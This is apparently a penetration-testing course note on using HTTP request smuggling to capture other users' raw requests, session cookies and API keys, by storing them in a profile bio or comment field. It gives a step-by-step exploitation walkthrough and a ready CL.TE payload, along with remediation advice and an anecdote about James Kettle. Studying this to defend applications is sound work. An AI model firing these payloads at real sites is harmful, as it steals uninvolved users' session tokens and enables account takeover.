---
tags: [vapt, smuggling, data-exfiltration, critical]
difficulty: advanced
module: "26 - HTTP Request Smuggling"
topic: "26.08 Smuggling to Capture Other Users' Requests"
---

# 26.08 — Smuggling to Capture Other Users' Requests

## What is it?
One of the most insidious and devastating impacts of HTTP Request Smuggling is the ability to steal the raw, unencrypted HTTP requests of other users who are actively using the application. 

When a user visits a site, their browser automatically sends their `Cookie` header (containing their session token), `Authorization` headers (containing JWTs or API keys), and sometimes CSRF tokens or sensitive form data.

**Request Capture via Smuggling** works by smuggling a request that is designed to write data to the application's database (e.g., updating your profile bio, posting a comment, or sending an email). The attacker crafts this smuggled request so that its `Content-Length` is intentionally too large, meaning it expects a huge "body" of text. 

When the next legitimate user's request comes down the TCP pipeline, the back-end assumes that the victim's *entire HTTP request* (headers, cookies, and all) is just the missing text belonging to the attacker's bio update! The back-end writes the victim's request into the database, where the attacker can simply log in and read it.

Think of it like submitting a form to a clerk. You hand the clerk a form that says "My Name is: ". Before you write your name, you freeze. The clerk stands there, waiting for the rest of the name. The next person walks up to the desk and hands the clerk their passport. The clerk assumes the passport *is* your name, staples it to your form, and files it in your cabinet.

## ASCII Diagram
```text
================================================================================
                    CAPTURING USER REQUESTS
================================================================================

[1. Attacker Sends Smuggling Payload (CL.TE)]
POST / HTTP/1.1
Content-Length: ...
Transfer-Encoding: chunked

0

POST /update_bio HTTP/1.1
Host: vulnerable.com
Cookie: session=attacker_token
Content-Type: application/x-www-form-urlencoded
Content-Length: 400            <-- HUGE LENGTH!

bio=hello                      <-- Missing 391 bytes of data!

[2. Back-End Logic]
"I am processing an update_bio request. The body starts with 'bio=hello'.
It says it has 400 bytes total. I will wait for the remaining 391 bytes."

[3. Victim sends a legitimate request]
GET /dashboard HTTP/1.1
Host: vulnerable.com
Cookie: session=SUPER_SECRET_VICTIM_TOKEN
User-Agent: Mozilla/5.0...

[4. Back-End Concatenation]
The Back-End treats the Victim's request as the missing 391 bytes!
It updates the attacker's bio to:
`helloGET /dashboard HTTP/1.1\r\nHost: vulnerable.com\r\nCookie: session=SUPER_SECRET_VICTIM_TOKEN...`

[Result: Attacker views their own profile and sees the Victim's raw request!]
================================================================================
```

## How to Find It
- **Manual steps:**
  1. Establish a working smuggling vulnerability (CL.TE, TE.CL).
  2. Find an endpoint that allows you to store and view text. Good candidates are:
     - Profile Bio / Description update (`POST /profile/edit`).
     - Commenting on a forum (`POST /forum/post`).
     - Submitting a support ticket (`POST /support/new`).
     - Sending a message to another user (send it to yourself).
  3. Ensure the text field accepts enough characters to fit a typical HTTP request header block (at least 500–1000 characters).

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Determine the exact length of the smuggled prefix up to the injection parameter.
  2. Construct the smuggled request targeting the data storage endpoint.
  3. Set the `Content-Length` of the *smuggled request* to a high value (e.g., `400`). Note: If you set it too high, and the victim's request is small, the back-end will hang waiting for *another* user to connect, which might cause a timeout. Start with `200`, then increase.
  4. Ensure the parameter you want to write to is the *very last* thing in the smuggled request. (e.g., `bio=`). Do not include a `\r\n` after it.
  5. Fire the payload.
  6. Immediately check the application (e.g., reload your profile page).
  7. If your bio now contains `GET / HTTP/1.1...`, you have successfully captured the next user's request.
  8. If your bio is unchanged, increase or decrease the `Content-Length` of the smuggled request and try again.

- **Actual payloads:**
  **CL.TE Payload to Capture Traffic:**
  ```http
  POST / HTTP/1.1
  Host: vulnerable.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 122
  Transfer-Encoding: chunked
  
  0
  
  POST /profile/update HTTP/1.1
  Host: vulnerable.com
  Cookie: session=attacker_token
  Content-Length: 300
  
  bio=
  ```
  *(The `Content-Length: 122` is for the carrier request. The `Content-Length: 300` tells the back-end to grab 300 bytes of the victim's request and assign it to the `bio` parameter).*

## Real-World Example
James Kettle famously used this technique during his research. He found a smuggling vulnerability on a system that allowed users to post comments. He smuggled a `POST /comment` request with a `Content-Length` of `800`. The next user to connect was an administrative automated script that fetched statistics from the application. The script passed an internal API key via an `Authorization: Bearer` header. The back-end appended the script's raw HTTP request into the body of Kettle's comment. Kettle refreshed the page, read his own comment, extracted the API key from the text, and gained full administrative access to the platform.

## How to Fix It
- **Developer remediation:**
  1. Fixing the underlying Request Smuggling vulnerability is the only true fix (See [[01 - What is HTTP Request Smuggling?]]).
  2. As defense-in-depth, strict input validation on data storage endpoints helps. If the `/profile/update` endpoint expects a bio, but it receives a string starting with `GET / HTTP/1.1`, the Web Application Firewall (WAF) or application logic should recognize it as an anomalous HTTP header injection and reject the update.

## Chaining Opportunities
- This vuln + [[16 - Authentication]] → Capturing cookies or JWTs leads directly to Account Takeover.
- This vuln + [[09 - Smuggling to Deliver XSS]] → If you can't capture the request, you can reflect XSS into the victim's browser instead.

## Related Notes
- [[01 - What is HTTP Request Smuggling?]]
- [[06 - Response Queue Poisoning]]
